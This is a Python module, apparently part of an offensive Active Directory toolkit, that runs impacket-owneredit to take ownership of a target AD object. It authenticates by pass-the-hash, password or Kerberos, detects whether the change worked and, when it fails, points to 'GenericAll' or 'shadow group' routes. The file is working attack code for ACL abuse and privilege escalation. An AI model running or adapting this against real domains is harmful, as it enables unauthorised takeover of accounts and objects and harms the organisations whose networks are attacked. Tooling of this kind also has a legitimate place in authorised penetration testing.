# modules/writeowner.py

from core.colors import red, green, blue, yellow
from core.helpers import run_command

def attack_write_owner(session, target_object, new_owner):
    print(blue(f"[*] Attempting to set owner of '{target_object}' to '{new_owner}' using impacket-owneredit..."))

    # === Build command based on auth method ===
    if session.hash:
        auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"{session.domain}/{session.username}:{session.password}"
    else:
        auth = f"{session.domain}/{session.username} -k -no-pass"

    cmd = (
        f"impacket-owneredit -action write -new-owner {new_owner} "
        f"-target '{target_object}' {auth} -dc-ip {session.dc_ip }"
    )

    # === Run command ===
    out, err = run_command(cmd)
    combined_output = (out + "\n" + err)

    # --- Success detection ---
    if any(kw in combined_output.lower() for kw in ["owner set", "success", "modified"]):
        print(green(f"[+] WriteOwner succeeded:\n"))
        print(green(out.strip()))
        return

    # --- Current owner info ---
    if "Current owner information below" in combined_output:
        print(yellow("[*] Current owner information below"))
        for line in combined_output.splitlines():
            if any(tag in line for tag in ["SID:", "sAMAccountName:", "distinguishedName:"]):
                print(yellow(line.strip()))

    # --- Constraint error detection ---
    if "0000051B" in combined_output or "constraint_att_type" in combined_output.lower():
        print(red("[-] WriteOwner blocked by AD schema constraint (error 0000051B)."))
        print(yellow("[!] This often means you’re not allowed to set owner on this object directly."))
        print(yellow("[!] Consider trying via 'GenericAll' or using a shadow group instead."))
        return

    # --- General failure ---
    print(red("[-] WriteOwner may have failed:"))
    print(red(err if err else out))
